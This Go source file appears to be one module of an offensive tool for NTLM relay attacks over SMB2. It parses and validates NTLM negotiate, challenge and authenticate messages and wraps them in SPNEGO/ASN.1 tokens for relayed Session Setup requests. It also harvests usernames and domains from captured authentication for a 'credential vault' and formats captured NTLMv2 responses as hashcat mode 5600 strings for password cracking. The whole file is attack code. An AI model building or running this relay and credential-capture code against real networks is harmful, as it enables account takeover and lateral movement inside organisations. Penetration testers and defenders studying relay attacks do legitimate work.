package commands

import (
	"bytes"
	"encoding/binary"
	"fmt"
)

// NTLM relay message structures and SPNEGO wrapping for SMB2 relay.
// These parse/encode the full NTLM messages (Type 1/2/3) and wrap them
// in SPNEGO tokens for SMB2 Session Setup.

// NTLM message type constants.
const (
	ntlmTypeNegotiate    = 1
	ntlmTypeChallenge    = 2
	ntlmTypeAuthenticate = 3
)

// ntlmsspOID is the NTLMSSP security mechanism OID (1.3.6.1.4.1.311.2.2.10)
// used in SPNEGO negTokenInit to advertise NTLM authentication.
var ntlmsspOID = []byte{0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a}

// relayNTLMSecBuf represents an NTLM security buffer (length, maxLength, offset).
type relayNTLMSecBuf struct {
	Length    uint16
	MaxLength uint16
	Offset   uint32
}

func readSecBuf(data []byte, off int) relayNTLMSecBuf {
	if off+8 > len(data) {
		return relayNTLMSecBuf{}
	}
	return relayNTLMSecBuf{
		Length:    binary.LittleEndian.Uint16(data[off : off+2]),
		MaxLength: binary.LittleEndian.Uint16(data[off+2 : off+4]),
		Offset:   binary.LittleEndian.Uint32(data[off+4 : off+8]),
	}
}

func (sb relayNTLMSecBuf) getData(msg []byte) []byte {
	end := uint32(sb.Length) + sb.Offset
	if sb.Length == 0 || end > uint32(len(msg)) {
		return nil
	}
	return msg[sb.Offset:end]
}

// relayNTLMType returns the NTLM message type (1, 2, or 3) or 0 if invalid.
func relayNTLMType(data []byte) uint32 {
	if len(data) < 12 || !bytes.Equal(data[0:8], sniffNTLMSig) {
		return 0
	}
	return binary.LittleEndian.Uint32(data[8:12])
}

// relayExtractType2Challenge extracts the 8-byte server challenge from
// an NTLM Type 2 message. Returns nil if the message is invalid.
func relayExtractType2Challenge(type2 []byte) []byte {
	if len(type2) < 32 {
		return nil
	}
	if relayNTLMType(type2) != ntlmTypeChallenge {
		return nil
	}
	challenge := make([]byte, 8)
	copy(challenge, type2[24:32])
	return challenge
}

// relayExtractType3Info extracts username and domain from an NTLM Type 3 message
// for logging and credential vault registration.
func relayExtractType3Info(type3 []byte) (user, domain string) {
	if relayNTLMType(type3) != ntlmTypeAuthenticate {
		return "", ""
	}
	if len(type3) < 52 {
		return "", ""
	}
	domainBuf := readSecBuf(type3, 28)
	userBuf := readSecBuf(type3, 36)
	domainData := domainBuf.getData(type3)
	userData := userBuf.getData(type3)
	if domainData != nil {
		domain = sniffDecodeUTF16LE(domainData)
	}
	if userData != nil {
		user = sniffDecodeUTF16LE(userData)
	}
	return user, domain
}

// relayBuildNTLMv2Hashcat builds a hashcat mode 5600 string from a Type 3
// message and the server challenge extracted from the relayed Type 2.
func relayBuildNTLMv2Hashcat(type3 []byte, serverChallenge []byte) string {
	if len(serverChallenge) != 8 {
		return ""
	}
	var sc [8]byte
	copy(sc[:], serverChallenge)
	hash := extractNTLMv2Hash(type3, sc)
	if hash == nil {
		return ""
	}
	return hash.HashcatFormat
}

// --- SPNEGO Wrapping/Unwrapping ---

// spnegoWrapNegTokenInit wraps an NTLM Type 1 message in a SPNEGO negTokenInit
// for the first SMB2 SESSION_SETUP request.
// Structure: APPLICATION[0] { SEQUENCE { [0] SEQUENCE { OID }, [2] OCTET STRING { Type1 } } }
func spnegoWrapNegTokenInit(ntlmType1 []byte) []byte {
	// mechToken [2] EXPLICIT OCTET STRING
	mechToken := asn1WrapExplicit(2, asn1WrapOctetString(ntlmType1))

	// mechTypes [0] EXPLICIT SEQUENCE { ntlmsspOID }
	mechTypeSeq := asn1WrapSequence(ntlmsspOID)
	mechTypes := asn1WrapExplicit(0, mechTypeSeq)

	// Inner SEQUENCE { mechTypes, mechToken }
	innerSeq := asn1WrapSequence(append(mechTypes, mechToken...))

	// APPLICATION [0] (constructed, class=application, tag=0)
	app := asn1WrapApplication(0, innerSeq)

	return app
}

// spnegoWrapNegTokenResp wraps an NTLM Type 3 message in a SPNEGO negTokenResp
// for the second SMB2 SESSION_SETUP request.
// Structure: [1] { SEQUENCE { [2] OCTET STRING { Type3 } } }
func spnegoWrapNegTokenResp(ntlmType3 []byte) []byte {
	// responseToken [2] EXPLICIT OCTET STRING
	responseToken := asn1WrapExplicit(2, asn1WrapOctetString(ntlmType3))

	// SEQUENCE { responseToken }
	seq := asn1WrapSequence(responseToken)

	// Context-specific [1] constructed
	return asn1WrapContextTag(1, seq)
}

// spnegoExtractNTLMToken extracts the raw NTLM message from a SPNEGO token.
// Works for both negTokenInit (Type 2 from server in negTokenResp) and
// negTokenResp wrappers. Scans for the NTLMSSP signature.
func spnegoExtractNTLMToken(spnegoData []byte) []byte {
	// Fast path: scan for NTLMSSP\x00 signature anywhere in the blob.
	// This is robust regardless of SPNEGO structure variations.
	idx := bytes.Index(spnegoData, sniffNTLMSig)
	if idx < 0 {
		return nil
	}
	return spnegoData[idx:]
}

// --- Minimal ASN.1 DER helpers ---

func asn1WrapLength(length int) []byte {
	if length < 0x80 {
		return []byte{byte(length)}
	}
	if length < 0x100 {
		return []byte{0x81, byte(length)}
	}
	return []byte{0x82, byte(length >> 8), byte(length & 0xff)}
}

func relayASN1Wrap(tag byte, content []byte) []byte {
	l := asn1WrapLength(len(content))
	buf := make([]byte, 0, 1+len(l)+len(content))
	buf = append(buf, tag)
	buf = append(buf, l...)
	buf = append(buf, content...)
	return buf
}

// asn1WrapSequence wraps content in a SEQUENCE (0x30).
func asn1WrapSequence(content []byte) []byte {
	return relayASN1Wrap(0x30, content)
}

// asn1WrapOctetString wraps content in an OCTET STRING (0x04).
func asn1WrapOctetString(content []byte) []byte {
	return relayASN1Wrap(0x04, content)
}

// asn1WrapExplicit wraps content in a context-specific explicit tag [N].
func asn1WrapExplicit(tag int, content []byte) []byte {
	return relayASN1Wrap(byte(0xa0|tag), content)
}

// asn1WrapApplication wraps content in APPLICATION [N] CONSTRUCTED.
func asn1WrapApplication(tag int, content []byte) []byte {
	return relayASN1Wrap(byte(0x60|tag), content)
}

// asn1WrapContextTag wraps content in a context-specific [N] CONSTRUCTED tag.
func asn1WrapContextTag(tag int, content []byte) []byte {
	return relayASN1Wrap(byte(0xa0|tag), content)
}

// relayNTLMValidate performs basic validation of an NTLM message.
func relayNTLMValidate(data []byte, expectedType uint32) error {
	if len(data) < 12 {
		return fmt.Errorf("NTLM message too short: %d bytes", len(data))
	}
	if !bytes.Equal(data[0:8], sniffNTLMSig) {
		return fmt.Errorf("invalid NTLM signature")
	}
	msgType := binary.LittleEndian.Uint32(data[8:12])
	if msgType != expectedType {
		return fmt.Errorf("expected NTLM type %d, got %d", expectedType, msgType)
	}
	return nil
}
